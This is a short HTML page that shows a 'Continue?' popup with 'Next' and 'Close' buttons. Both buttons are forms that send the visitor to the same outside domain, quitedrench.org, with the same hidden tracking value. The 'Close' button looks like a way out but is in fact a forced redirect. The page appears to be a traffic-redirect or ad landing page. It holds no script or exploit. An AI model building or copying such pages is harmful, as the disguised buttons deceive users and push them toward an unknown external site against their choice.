<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Continue</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    html, body { width: 100%; min-height: 100%; }

    body {
      min-height: 100vh;
      font-family: Arial, Helvetica, sans-serif;
      background: linear-gradient(135deg, #f5f7fb 0%, #e9edf5 100%);
    }

    .overlay {
      position: fixed;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
      background: rgba(16, 24, 40, 0.42);
    }

    .popup {
      width: min(92vw, 430px);
      background: #fff;
      border-radius: 20px;
      padding: 28px;
      box-shadow: 0 22px 60px rgba(0,0,0,.22);
      text-align: center;
    }

    h2 {
      font-size: 24px;
      color: #111827;
      margin-bottom: 10px;
    }

    p {
      color: #667085;
      font-size: 15px;
      line-height: 1.5;
      margin-bottom: 24px;
    }

    .actions {
      display: grid;
      grid-template-columns: 2fr 1fr;
      gap: 12px;
      width: 100%;
    }

    .actions form { width: 100%; }

    .btn {
      width: 100%;
      min-height: 52px;
      border: 0;
      border-radius: 12px;
      padding: 0 18px;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
    }

    .btn-next {
      background: #2563eb;
      color: #fff;
      box-shadow: 0 8px 20px rgba(37,99,235,.28);
    }

    .btn-close {
      background: #eef2f7;
      color: #344054;
    }

    @media (max-width: 420px) {
      .popup { padding: 22px; border-radius: 16px; }
      .actions { gap: 8px; }
      .btn { min-height: 50px; font-size: 15px; }
    }
  </style>
</head>
<body>
  <div class="overlay">
    <div class="popup">
      <h2>Continue?</h2>
      <p>Please choose an option below to continue.</p>

      <div class="actions">
        <form action="https://quitedrench.org/" method="get" target="_self">
          <input type="hidden" name="abigc" value="1146487">
          <button class="btn btn-next" type="submit">Next</button>
        </form>

        <form action="https://quitedrench.org/" method="get" target="_self">
          <input type="hidden" name="abigc" value="1146487">
          <button class="btn btn-close" type="submit">Close</button>
        </form>
      </div>
    </div>
  </div>
</body>
</html>
